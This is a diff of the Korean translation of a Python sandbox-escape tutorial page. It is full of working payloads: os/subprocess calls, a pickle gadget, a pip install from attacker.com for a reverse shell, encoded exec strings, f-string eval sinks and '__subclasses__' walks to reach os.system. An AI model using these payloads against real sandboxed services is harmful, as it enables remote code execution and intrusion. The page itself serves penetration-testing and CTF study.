@@ -1,5 +1,7 @@
 # Python sandbox 우회
 
+{{#include ../../../banners/hacktricks-training.md}}
+
 Python sandbox 보호를 우회하고 임의의 명령을 실행하는 몇 가지 트릭입니다.<sup>[[1]](#references)[[2]](#references)</sup>
 
 {{#ref}}
@@ -7,9 +9,9 @@ js2py-sandbox-escape-cve-2024-28397.md
 {{#endref}}
 
 
-## 명령 실행 라이브러리
+## Command Execution Libraries
 
-가장 먼저 알아야 할 것은 이미 import된 라이브러리를 사용해 코드를 직접 실행할 수 있는지, 또는 다음 라이브러리 중 하나라도 import할 수 있는지 여부입니다:
+가장 먼저 확인해야 할 것은 이미 import된 라이브러리를 사용해 code를 직접 실행할 수 있는지, 또는 다음 라이브러리 중 하나라도 import할 수 있는지 여부입니다:
 ```python
 os.system("ls")
 os.popen("ls").read()
@@ -42,21 +44,21 @@ open('/var/www/html/input', 'w').write('123')
 execfile('/usr/lib/python2.7/os.py')
 system('ls')
 ```
-`_**open**_` 및 `_**read**_` 함수는 python sandbox 내부의 **파일을 읽고**, sandbox를 **우회**하기 위해 **실행**할 수 있는 **코드**를 작성하는 데 유용할 수 있습니다.
+`_**open**_` 및 `_**read**_` 함수는 python sandbox 내부의 **파일을 읽고**, **sandbox를 우회**하기 위해 **실행**할 수 있는 일부 코드를 **작성**하는 데 유용할 수 있다는 점을 기억하세요.
 
-> [!CAUTION] > **Python2 input()** 함수는 프로그램이 중단되기 전에 python 코드를 실행할 수 있습니다.
+> [!CAUTION] > **Python2 input()** 함수는 프로그램이 crash하기 전에 python code를 실행할 수 있습니다.
 
-Python은 먼저 현재 디렉터리에서 **라이브러리를 로드**하려고 합니다(다음 명령은 python이 모듈을 로드하는 위치를 출력합니다): `python3 -c 'import sys; print(sys.path)'`
+Python은 먼저 현재 디렉터리에서 **library를 load**하려고 합니다(다음 command는 Python이 module을 load하는 위치를 출력합니다): `python3 -c 'import sys; print(sys.path)'`
 
-![Python sandbox 우회 - Command Execution Libraries: Python은 먼저 현재 디렉터리에서 라이브러리를 로드하려고 합니다(다음 명령은 python이 모듈을 로드하는 위치를 출력합니다...](<../../../images/image (559).png>)
+![Python sandbox 우회 - Command Execution Libraries: Python은 먼저 현재 디렉터리에서 library를 load하려고 합니다(다음 command는 Python이 module을 load하는 위치를 출력합니다...](<../../../images/image (559).png>)
 
-## 기본 설치된 python packages를 사용한 pickle sandbox 우회
+## 기본으로 설치된 python package를 사용하여 pickle sandbox 우회
 
-### 기본 packages
+### 기본 package
 
-여기에서 **사전 설치된** packages의 **목록**을 확인할 수 있습니다: [https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html](https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html)\
-pickle을 사용하면 시스템에 설치된 **임의의 라이브러리를 import**하도록 python env를 만들 수 있습니다.\
-예를 들어 다음 pickle은 로드될 때 pip library를 사용하기 위해 이를 import합니다:
+여기에서 **사전 설치된** package **목록**을 확인할 수 있습니다: [https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html](https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html)\
+pickle을 사용하면 시스템에 설치된 **임의의 library를 import**하도록 python env를 만들 수 있습니다.\
+예를 들어 다음 pickle을 load하면 이를 사용하기 위해 pip library를 import합니다:
 ```python
 #Note that here we are importing the pip library so the pickle is created correctly
 #however, the victim doesn't even need to have the library installed to execute it
@@ -69,7 +71,7 @@ return (pip.main,(["list"],))
 
 print(base64.b64encode(pickle.dumps(P(), protocol=0)))
 ```
-pickle 작동 방식에 대한 자세한 내용은 다음을 확인하세요: [https://checkoway.net/musings/pickle/](https://checkoway.net/musings/pickle/).<sup>[[16]](#references)</sup>
+pickle의 작동 방식에 대한 자세한 내용은 다음을 확인하세요: [https://checkoway.net/musings/pickle/](https://checkoway.net/musings/pickle/).<sup>[[16]](#references)</sup>
 
 ### Pip package
 
@@ -80,7 +82,7 @@ pickle 작동 방식에 대한 자세한 내용은 다음을 확인하세요: [h
 pip install http://attacker.com/Rerverse.tar.gz
 pip.main(["install", "http://attacker.com/Rerverse.tar.gz"])
 ```
-여기에서 reverse shell을 생성하기 위한 package를 download할 수 있습니다. 사용하기 전에 **압축을 해제하고, `setup.py`를 변경한 다음, reverse shell에 사용할 IP를 입력해야 한다는 점에 유의하세요**:
+reverse shell을 생성하기 위한 package는 여기에서 download할 수 있습니다. 사용하기 전에 **압축을 풀고, `setup.py`을 변경한 다음, reverse shell에 사용할 IP를 입력해야 합니다**:
 
 {{#file}}
 Reverse.tar (1).gz
@@ -92,9 +94,9 @@ Reverse.tar (1).gz
 ## Python code Eval-ing
 
 > [!WARNING]
-> exec은 여러 줄 문자열과 `;`를 허용하지만, eval은 허용하지 않는다는 점에 유의하세요(walrus operator 확인).
+> exec은 여러 줄 문자열과 `;`을 허용하지만, eval은 허용하지 않는다는 점에 유의하세요(walrus operator 확인).
 
-특정 문자가 금지된 경우 **hex/octal/B64** representation을 사용하여 해당 제한을 **bypass**할 수 있습니다:
+특정 문자가 금지된 경우 **hex/octal/B64** 표현을 사용하여 해당 제한을 **bypass**할 수 있습니다:
 ```python
 exec("print('RCE'); __import__('os').system('ls')") #Using ";"
 exec("print('RCE')\n__import__('os').system('ls')") #Using "\n"
@@ -117,7 +119,7 @@ exec(__import__('base64').b64decode('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='))
 ```
 ### F-string 재평가 sink
 
-다르지만 매우 흔한 bug는 **공격자가 제어하는 data를 string에 삽입한 다음 해당 string을 f-string으로 평가하는 것**입니다. 이는 **Jinja/SSTI가 아닙니다**. 두 번째 평가 단계에서 Python interpreter 자체가 `{...}` 내부에 삽입된 모든 것을 실행합니다:<sup>[[10]](#references)</sup>
+다르지만 매우 흔한 bug는 **공격자가 제어하는 데이터를 문자열에 삽입한 다음 해당 문자열을 f-string으로 평가하는 것**입니다. 이는 **Jinja/SSTI가 아닙니다**. 두 번째 평가 단계에서 Python 인터프리터 자체가 `{...}` 내부에 배치된 모든 것을 실행합니다:<sup>[[10]](#references)</sup>
 ```python
 def template(first, last, gender):
 text = f"Patient {first} {last} ({gender})"
@@ -133,11 +135,11 @@ s = "{2+3}"
 eval(f"f'''{s}'''")
 # '5'
 ```
-따라서 braces, quotes, dots, underscores 및 parentheses가 허용된다면 다음과 같은 payload로 대개 command execution이 가능합니다:
+따라서 중괄호, 따옴표, 점, 밑줄 및 괄호가 허용되는 경우 다음과 같은 payload로 일반적으로 command execution이 가능합니다:
 ```python
 {__import__("os").popen("id").read()}
 ```
-공백이나 shell 메타문자가 필터링되는 경우, 명령을 Base64로 래핑하고 expression 내부에서 디코딩합니다:
+공백이나 shell 메타문자가 필터링되는 경우, 명령을 Base64로 감싼 뒤 표현식 내부에서 디코드합니다:
 ```python
 {__import__("os").popen(__import__("base64").b64decode("aWQK").decode()).read()}
 ```
@@ -145,10 +147,10 @@ eval(f"f'''{s}'''")
 
 - `eval(f"f'''{user_input}'''")`
 - `eval(f'f"{user_input}"')`
-- 사용자 데이터를 사용해 template을 구성한 후, 재구성된 문자열에 `eval`, `exec` 또는 `compile`을 호출하는 code
-- regex로 문자를 검증하지만 `{}`와 따옴표는 여전히 허용하는 XML/JSON handler
+- user data로 template을 구성한 다음, 재구성된 문자열에 `eval`, `exec` 또는 `compile`을 호출하는 code
+- regex로 문자를 검증하지만 여전히 `{}`와 따옴표를 허용하는 XML/JSON handler
 
-sink가 `request.data`에서 raw XML/bytes를 파싱하는 Flask endpoint 뒤에 있다면, `curl -d`는 기본적으로 `application/x-www-form-urlencoded`를 사용하므로 `request.data`가 비어 있을 수 있습니다. 대신 **non-form** content type을 사용하세요:
+sink가 `request.data`에서 raw XML/bytes를 파싱하는 Flask endpoint 뒤에 있는 경우, `curl -d`는 기본적으로 `application/x-www-form-urlencoded`를 사용하므로 `request.data`가 비어 있을 수 있습니다. 대신 **non-form** content type을 사용하세요:
 ```bash
 curl http://127.0.0.1:54321/addPatient \
 -X POST \
@@ -171,13 +173,13 @@ df.query("@pd.annotations.__class__.__init__.__globals__['__builtins__']['eval']
 ```
 실제 sandboxed evaluator escape 사례는 PDF generators에서도 확인할 수 있습니다:
 
-- ReportLab/xhtml2pdf triple-bracket [[[...]]] expression evaluation → RCE (CVE-2023-33733). 평가된 attributes(예: font color)에서 function.__globals__ 및 os.system에 도달하기 위해 rl_safe_eval을 악용하며, rendering을 안정적으로 유지하기 위해 유효한 값을 반환합니다.<sup>[[7]](#references)[[8]](#references)[[9]](#references)</sup>
+- ReportLab/xhtml2pdf triple-bracket [[[...]]] expression evaluation → RCE (CVE-2023-33733). 이는 evaluated attributes(예: font color)에서 function.__globals__ 및 os.system에 도달하기 위해 rl_safe_eval을 악용하고, rendering이 안정적으로 유지되도록 유효한 값을 반환합니다.<sup>[[7]](#references)[[8]](#references)[[9]](#references)</sup>
 
 {{#ref}}
 reportlab-xhtml2pdf-triple-brackets-expression-evaluation-rce-cve-2023-33733.md
 {{#endref}}
 
-## Operators 및 짧은 tricks
+## Operators 및 short tricks
 ```python
 # walrus operator allows generating variable inside a list
 ## everything will be executed in order
@@ -188,7 +190,7 @@ reportlab-xhtml2pdf-triple-brackets-expression-evaluation-rce-cve-2023-33733.md
 ```
 ## 인코딩을 통한 보호 우회 (UTF-7)
 
-[**이 writeup**](https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy)에서는 겉보기에는 sandbox인 환경 내부에서 임의의 Python code를 로드하고 실행하는 데 UFT-7을 사용합니다:<sup>[[11]](#references)</sup>
+[**이 writeup**](https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy)에서는 겉보기에는 sandbox인 환경 내부에서 임의의 Python code를 로드하고 실행하기 위해 UFT-7이 사용됩니다.<sup>[[11]](#references)</sup>
 ```python
 assert b"+AAo-".decode("utf_7") == "\n"
 
@@ -199,11 +201,11 @@ return x
 #+AAo-print(open("/flag.txt").read())
 """.lstrip()
 ```
-다른 인코딩을 사용하여 우회할 수도 있습니다. 예: `raw_unicode_escape` 및 `unicode_escape`.
+다른 encoding을 사용하여 우회하는 것도 가능합니다. 예: `raw_unicode_escape` 및 `unicode_escape`.
 
 ## 호출 없이 Python 실행
 
-**호출을 수행하는 것을 허용하지 않는** Python jail 내부에 있더라도 **임의의 함수, code** 및 **commands를 실행**하는 방법이 여전히 있습니다.
+**호출을 허용하지 않는** Python jail 내부에 있더라도 **임의의 functions, code** 및 **commands를 실행**할 수 있는 방법이 여전히 있습니다.
 
 ### [decorators](https://docs.python.org/3/glossary.html#term-decorator)를 사용한 RCE
 ```python
@@ -227,13 +229,13 @@ X = exec(X)
 @'__import__("os").system("sh")'.format
 class _:pass
 ```
-### 객체 생성 및 오버로딩을 통한 RCE
+### RCE 객체 생성 및 오버로딩
 
-**class를 선언**하고 해당 class의 **object를 생성**할 수 있다면, 직접 호출하지 않아도 **trigger될** 수 있는 **여러 method를 작성하거나 덮어쓸** 수 있습니다.
+**클래스를 선언**하고 해당 클래스의 **객체를 생성**할 수 있다면, 직접 호출할 **필요 없이** **트리거될** 수 있는 다양한 메서드를 **작성하거나 덮어쓸** 수 있습니다.
 
-#### custom class를 통한 RCE
+#### RCE 사용자 정의 클래스 사용
 
-일부 **class method**를 수정하여 (_기존 class method를 덮어쓰거나 새로운 class를 생성하여_) 직접 호출하지 않아도 **trigger될** 때 **임의의 code를 실행**하도록 만들 수 있습니다.
+일부 **클래스 메서드**를 수정하여(_기존 클래스 메서드를 덮어쓰거나 새 클래스를 생성하여_) 직접 호출하지 않고도 **트리거될** 때 **임의의 코드를 실행**하도록 만들 수 있습니다.
 ```python
 # This class has 3 different ways to trigger RCE without directly calling any function
 class RCE:
@@ -283,9 +285,9 @@ __iand__ (k = 'import os; os.system("sh")')
 __ior__ (k |= 'import os; os.system("sh")')
 __ixor__ (k ^= 'import os; os.system("sh")')
 ```
-#### [metaclasses](https://docs.python.org/3/reference/datamodel.html#metaclasses)를 사용한 객체 생성
+#### [metaclasses](https://docs.python.org/3/reference/datamodel.html#metaclasses)로 객체 생성
 
-metaclasses를 사용하면 새로운 클래스를 생성하고 대상 클래스를 해당 클래스의 metaclass로 지정하여, **constructor를 직접 호출하지 않고 클래스의 인스턴스를 생성**할 수 있다는 점이 핵심입니다.<sup>[[15]](#references)</sup>
+metaclasses를 사용하면 **constructor를 직접 호출하지 않고도 class의 instance를 생성할 수 있습니다**. 이를 위해 대상 class를 metaclass로 지정하여 새로운 class를 생성합니다.<sup>[[15]](#references)</sup>
 ```python
 # Code from https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/ and fixed
 # This will define the members of the "subclass"
@@ -353,22 +355,22 @@ a.__class__.__exit__ = lambda self, *args: None
 with (a as b):
 pass
 ```
-## 내장 기능
+## Builtins
 
-- [**python2 내장 함수**](https://docs.python.org/2/library/functions.html)
-- [**python3 내장 함수**](https://docs.python.org/3/library/functions.html)
+- [**Python 2의 Builtins 함수**](https://docs.python.org/2/library/functions.html)
+- [**Python 3의 Builtins 함수**](https://docs.python.org/3/library/functions.html)
 
-**`__builtins__`** object에 접근할 수 있다면 libraries를 import할 수 있습니다(여기서 마지막 섹션에 나온 다른 string representation도 사용할 수 있다는 점에 유의하세요):
+**`__builtins__`** 객체에 접근할 수 있다면 libraries를 import할 수 있습니다(마지막 섹션에 나온 다른 문자열 표현도 여기서 사용할 수 있다는 점에 유의하세요):
 ```python
 __builtins__.__import__("os").system("ls")
 __builtins__.__dict__['__import__']("os").system("ls")
 ```
-### Builtins 없음
+### No Builtins
 
-`__builtins__`가 없으면 아무것도 import할 수 없고 파일을 읽거나 쓸 수도 없습니다. **모든 전역 함수**(`open`, `import`, `print` 등)가 **로드되지 않기** 때문입니다.\
-하지만 **기본적으로 Python은 많은 모듈을 메모리에 import합니다**. 이러한 모듈은 무해해 보일 수 있지만, 일부 모듈은 내부에서 **위험한** 기능도 **import**하며, 이 기능에 접근하면 **임의 코드 실행**까지도 가능합니다.<sup>[[4]](#references)[[5]](#references)</sup>
+`__builtins__`가 없으면 아무것도 `import`할 수 없을 뿐만 아니라 파일을 읽거나 쓸 수도 없습니다. **모든 전역 함수**(`open`, `import`, `print` 등)가 **로드되지 않기 때문입니다**.\
+하지만 **기본적으로 Python은 많은 모듈을 메모리에 import합니다**. 이러한 모듈은 무해해 보일 수 있지만, 일부 모듈은 내부에서 **위험한** 기능도 **import**하며, 이를 이용해 **임의 코드 실행**까지 수행할 수 있습니다.<sup>[[4]](#references)[[5]](#references)</sup>
 
-다음 예제에서는 로드된 이러한 "**무해한**" 모듈을 **abuse**하여 내부의 **위험한** **기능에 접근**하는 방법을 확인할 수 있습니다.
+다음 예제에서는 로드된 이러한 "**무해한**" 모듈을 **악용**하여 내부의 **위험한** **기능에 접근**하는 방법을 확인할 수 있습니다.
 
 **Python2**
 ```python
@@ -410,7 +412,7 @@ get_flag.__globals__['__builtins__']
 # Get builtins from loaded classes
 [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "builtins" in x.__init__.__globals__ ][0]["builtins"]
 ```
-[**아래에는**](#recursive-search-of-builtins-globals) **builtins**를 찾을 수 있는 수십/**수백** 개의 **위치**를 찾는 **더 큰 함수**가 있습니다.
+[**아래에는 더 큰 함수가 있습니다**](#recursive-search-of-builtins-globals). 이 함수는 **builtins**를 찾을 수 있는 수십/**수백** 개의 **위치**를 찾습니다.
 
 #### Python2 및 Python3
 ```python
@@ -426,7 +428,7 @@ __builtins__["__import__"]("os").system("ls")
 # There are lots of other payloads that can be abused to execute commands
 # See them below
 ```
-## 전역 변수와 지역 변수
+## Globals and locals
 
 **`globals`**와 **`locals`**를 확인하면 접근할 수 있는 항목을 파악하는 데 유용합니다.
 ```python
@@ -452,15 +454,15 @@ class_obj.__init__.__globals__
 [ x for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__)]
 [<class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.FileFinder'>, <class 'zipimport.zipimporter'>, <class 'zipimport._ZipImportResourceReader'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class 'reprlib.Repr'>, <class 'functools.partialmethod'>, <class 'functools.singledispatchmethod'>, <class 'functools.cached_property'>, <class 'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>, <class 'sre_parse.State'>, <class 'sre_parse.SubPattern'>, <class 'sre_parse.Tokenizer'>, <class 're.Scanner'>, <class 'rlcompleter.Completer'>, <class 'dis.Bytecode'>, <class 'string.Template'>, <class 'cmd.Cmd'>, <class 'tokenize.Untokenizer'>, <class 'inspect.BlockFinder'>, <class 'inspect.Parameter'>, <class 'inspect.BoundArguments'>, <class 'inspect.Signature'>, <class 'bdb.Bdb'>, <class 'bdb.Breakpoint'>, <class 'traceback.FrameSummary'>, <class 'traceback.TracebackException'>, <class '__future__._Feature'>, <class 'codeop.Compile'>, <class 'codeop.CommandCompiler'>, <class 'code.InteractiveInterpreter'>, <class 'pprint._safe_key'>, <class 'pprint.PrettyPrinter'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class 'threading._RLock'>, <class 'threading.Condition'>, <class 'threading.Semaphore'>, <class 'threading.Event'>, <class 'threading.Barrier'>, <class 'threading.Thread'>, <class 'subprocess.CompletedProcess'>, <class 'subprocess.Popen'>]
 ```
-[**더 큰 함수가 아래에 있습니다**](#recursive-search-of-builtins-globals) **globals**를 찾을 수 있는 수십/**수백** 개의 **장소**를 찾기 위한 함수입니다.
+[**아래에는 더 큰 함수가 있습니다**](#recursive-search-of-builtins-globals)에서 **globals**를 찾을 수 있는 **장소**를 수십/**수백** 곳 확인할 수 있습니다.
 
-## Discover Arbitrary Execution
+## 임의 실행 탐색
 
-여기서는 **더 위험한 기능이 로드된 것**을 쉽게 발견하고, 더 안정적인 exploit을 제안하는 방법을 설명합니다.
+여기서는 **더 위험한 기능이 로드된 경우**를 쉽게 탐색하고, 더 신뢰할 수 있는 exploit을 제안하는 방법을 설명합니다.
 
-#### bypasses를 통한 subclasses 액세스
+#### bypass를 사용한 subclasses 액세스
 
-이 기법에서 가장 민감한 부분 중 하나는 **base subclasses에 액세스**할 수 있어야 한다는 것입니다. 이전 예제에서는 `''.__class__.__base__.__subclasses__()`를 사용했지만, **다른 방법도 있습니다**:
+이 technique에서 가장 민감한 부분 중 하나는 **base subclasses에 액세스**할 수 있는 것입니다. 이전 예제에서는 `''.__class__.__base__.__subclasses__()`를 사용했지만, **다른 방법도** 있습니다:
 ```python
 #You can access the base from mostly anywhere (in regular conditions)
 "".__class__.__base__.__subclasses__()
@@ -488,9 +490,9 @@ defined_func.__class__.__base__.__subclasses__()
 (''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')()|attr('__getitem__')(132)|attr('__init__')|attr('__globals__')|attr('__getitem__')('popen'))('cat+flag.txt').read()
 (''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fmro\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')(1)|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(132)|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('popen'))('cat+flag.txt').read()
 ```
-### 위험한 library 로드 찾기
+### 위험한 라이브러리 로드 찾기
 
-예를 들어 **`sys`** library를 사용하면 **임의의 library를 import**할 수 있다는 점을 알고 있으므로, 내부에서 sys를 import한 **로드된 모든 module**을 검색할 수 있습니다:
+예를 들어 **`sys`** 라이브러리를 사용하면 **임의의 라이브러리를 import**할 수 있다는 것을 알고 있으므로, 내부에서 sys를 import한 **로드된 모든 모듈**을 검색할 수 있습니다:
 ```python
 [ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ]
 ['_ModuleLock', '_DummyModuleLock', '_ModuleLockManager', 'ModuleSpec', 'FileLoader', '_NamespacePath', '_NamespaceLoader', 'FileFinder', 'zipimporter', '_ZipImportResourceReader', 'IncrementalEncoder', 'IncrementalDecoder', 'StreamReaderWriter', 'StreamRecoder', '_wrap_close', 'Quitter', '_Printer', 'WarningMessage', 'catch_warnings', '_GeneratorContextManagerBase', '_BaseExitStack', 'Untokenizer', 'FrameSummary', 'TracebackException', 'CompletedProcess', 'Popen', 'finalize', 'NullImporter', '_HackedGetData', '_localized_month', '_localized_day', 'Calendar', 'different_locale', 'SSLObject', 'Request', 'OpenerDirector', 'HTTPPasswordMgr', 'AbstractBasicAuthHandler', 'AbstractDigestAuthHandler', 'URLopener', '_PaddedFile', 'CompressedValue', 'LogRecord', 'PercentStyle', 'Formatter', 'BufferingFormatter', 'Filter', 'Filterer', 'PlaceHolder', 'Manager', 'LoggerAdapter', '_LazyDescr', '_SixMetaPathImporter', 'MimeTypes', 'ConnectionPool', '_LazyDescr', '_SixMetaPathImporter', 'Bytecode', 'BlockFinder', 'Parameter', 'BoundArguments', 'Signature', '_DeprecatedValue', '_ModuleWithDeprecations', 'Scrypt', 'WrappedSocket', 'PyOpenSSLContext', 'ZipInfo', 'LZMACompressor', 'LZMADecompressor', '_SharedFile', '_Tellable', 'ZipFile', 'Path', '_Flavour', '_Selector', 'JSONDecoder', 'Response', 'monkeypatch', 'InstallProgress', 'TextProgress', 'BaseDependency', 'Origin', 'Version', 'Package', '_Framer', '_Unframer', '_Pickler', '_Unpickler', 'NullTranslations']
@@ -499,7 +501,7 @@ defined_func.__class__.__base__.__subclasses__()
 ```python
 [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ][0]["sys"].modules["os"].system("ls")
 ```
-**명령을 실행하는 데 사용될 수 있는 것으로 알려진 다른 라이브러리**에도 동일한 작업을 수행할 수 있습니다:
+**명령을 실행하는 데 사용할 수 있는 것으로 알려진 다른 라이브러리**에도 같은 작업을 수행할 수 있습니다:
 ```python
 #os
 [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "os" in x.__init__.__globals__ ][0]["os"].system("ls")
@@ -533,7 +535,7 @@ defined_func.__class__.__base__.__subclasses__()
 #pdb
 [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "pdb" in x.__init__.__globals__ ][0]["pdb"].os.system("ls")
 ```
-또한, 악성 libraries를 로드하는 modules도 검색할 수 있습니다:
+또한, 악성 라이브러리를 로드하고 있는 모듈을 검색할 수도 있습니다:
 ```python
 bad_libraries_names = ["os", "commands", "subprocess", "pty", "importlib", "imp", "sys", "builtins", "pip", "pdb"]
 for b in bad_libraries_names:
@@ -552,7 +554,7 @@ builtins: FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, IncrementalE
 pdb:
 """
 ```
-또한 **다른 라이브러리**가 **명령을 실행하기 위해 함수를 호출**할 수 있다고 생각된다면, 가능한 라이브러리 내부의 **함수 이름으로도** 필터링할 수 있습니다:
+또한, **명령을 실행하기 위해 함수를 호출할 수 있는 다른 라이브러리**가 있을 수 있다고 생각한다면, 가능한 라이브러리 내부의 **함수 이름으로 필터링**할 수도 있습니다:
 ```python
 bad_libraries_names = ["os", "commands", "subprocess", "pty", "importlib", "imp", "sys", "builtins", "pip", "pdb"]
 bad_func_names = ["system", "popen", "getstatusoutput", "getoutput", "call", "Popen", "spawn", "import_module", "__import__", "load_source", "execfile", "execute", "__builtins__"]
@@ -585,10 +587,10 @@ execute:
 __builtins__: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, zipimporter, _ZipImportResourceReader, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, _wrap_close, Quitter, _Printer, DynamicClassAttribute, _GeneratorWrapper, WarningMessage, catch_warnings, Repr, partialmethod, singledispatchmethod, cached_property, _GeneratorContextManagerBase, _BaseExitStack, Completer, State, SubPattern, Tokenizer, Scanner, Untokenizer, FrameSummary, TracebackException, _IterationGuard, WeakSet, _RLock, Condition, Semaphore, Event, Barrier, Thread, CompletedProcess, Popen, finalize, _TemporaryFileCloser, _TemporaryFileWrapper, SpooledTemporaryFile, TemporaryDirectory, NullImporter, _HackedGetData, DOMBuilder, DOMInputSource, NamedNodeMap, TypeInfo, ReadOnlySequentialNamedNodeMap, ElementInfo, Template, Charset, Header, _ValueFormatter, _localized_month, _localized_day, Calendar, different_locale, AddrlistClass, _PolicyBase, BufferedSubFile, FeedParser, Parser, BytesParser, Message, HTTPConnection, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, Address, Group, HeaderRegistry, ContentManager, CompressedValue, _Feature, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, _LazyDescr, _SixMetaPathImporter, Queue, _PySimpleQueue, HMAC, Timeout, Retry, HTTPConnection, MimeTypes, RequestField, RequestMethods, DeflateDecoder, GzipDecoder, MultiDecoder, ConnectionPool, CharSetProber, CodingStateMachine, CharDistributionAnalysis, JapaneseContextAnalysis, UniversalDetector, _LazyDescr, _SixMetaPathImporter, Bytecode, BlockFinder, Parameter, BoundArguments, Signature, _DeprecatedValue, _ModuleWithDeprecations, DSAParameterNumbers, DSAPublicNumbers, DSAPrivateNumbers, ObjectIdentifier, ECDSA, EllipticCurvePublicNumbers, EllipticCurvePrivateNumbers, RSAPrivateNumbers, RSAPublicNumbers, DERReader, BestAvailableEncryption, CBC, XTS, OFB, CFB, CFB8, CTR, GCM, Cipher, _CipherContext, _AEADCipherContext, AES, Camellia, TripleDES, Blowfish, CAST5, ARC4, IDEA, SEED, ChaCha20, _FragList, _SSHFormatECDSA, Hash, SHAKE128, SHAKE256, BLAKE2b, BLAKE2s, NameAttribute, RelativeDistinguishedName, Name, RFC822Name, DNSName, UniformResourceIdentifier, DirectoryName, RegisteredID, IPAddress, OtherName, Extensions, CRLNumber, AuthorityKeyIdentifier, SubjectKeyIdentifier, AuthorityInformationAccess, SubjectInformationAccess, AccessDescription, BasicConstraints, DeltaCRLIndicator, CRLDistributionPoints, FreshestCRL, DistributionPoint, PolicyConstraints, CertificatePolicies, PolicyInformation, UserNotice, NoticeReference, ExtendedKeyUsage, TLSFeature, InhibitAnyPolicy, KeyUsage, NameConstraints, Extension, GeneralNames, SubjectAlternativeName, IssuerAlternativeName, CertificateIssuer, CRLReason, InvalidityDate, PrecertificateSignedCertificateTimestamps, SignedCertificateTimestamps, OCSPNonce, IssuingDistributionPoint, UnrecognizedExtension, CertificateSigningRequestBuilder, CertificateBuilder, CertificateRevocationListBuilder, RevokedCertificateBuilder, _OpenSSLError, Binding, _X509NameInvalidator, PKey, _EllipticCurve, X509Name, X509Extension, X509Req, X509, X509Store, X509StoreContext, Revoked, CRL, PKCS12, NetscapeSPKI, _PassphraseHelper, _CallbackExceptionHelper, Context, Connection, _CipherContext, _CMACContext, _X509ExtensionParser, DHPrivateNumbers, DHPublicNumbers, DHParameterNumbers, _DHParameters, _DHPrivateKey, _DHPublicKey, Prehashed, _DSAVerificationContext, _DSASignatureContext, _DSAParameters, _DSAPrivateKey, _DSAPublicKey, _ECDSASignatureContext, _ECDSAVerificationContext, _EllipticCurvePrivateKey, _EllipticCurvePublicKey, _Ed25519PublicKey, _Ed25519PrivateKey, _Ed448PublicKey, _Ed448PrivateKey, _HashContext, _HMACContext, _Certificate, _RevokedCertificate, _CertificateRevocationList, _CertificateSigningRequest, _SignedCertificateTimestamp, OCSPRequestBuilder, _SingleResponse, OCSPResponseBuilder, _OCSPResponse, _OCSPRequest, _Poly1305Context, PSS, OAEP, MGF1, _RSASignatureContext, _RSAVerificationContext, _RSAPrivateKey, _RSAPublicKey, _X25519PublicKey, _X25519PrivateKey, _X448PublicKey, _X448PrivateKey, Scrypt, PKCS7SignatureBuilder, Backend, GetCipherByName, WrappedSocket, PyOpenSSLContext, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, RawJSON, JSONDecoder, JSONEncoder, Cookie, CookieJar, MockRequest, MockResponse, Response, BaseAdapter, UnixHTTPConnection, monkeypatch, JSONDecoder, JSONEncoder, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _WrappedLock, Cache, ProblemResolver, _FilteredCacheHelper, FilteredCache, _Framer, _Unframer, _Pickler, _Unpickler, NullTranslations, _wrap_close
 """
 ```
-## Builtins, Globals... 재귀 검색
+## Builtins, Globals 등의 재귀적 검색
 
 > [!WARNING]
-> 정말 **대단합니다**. **globals, builtins, open 또는 무엇이든 object를 찾고 있다면**, 이 script를 사용해 **해당 object를 찾을 수 있는 위치를 재귀적으로 검색하세요.**
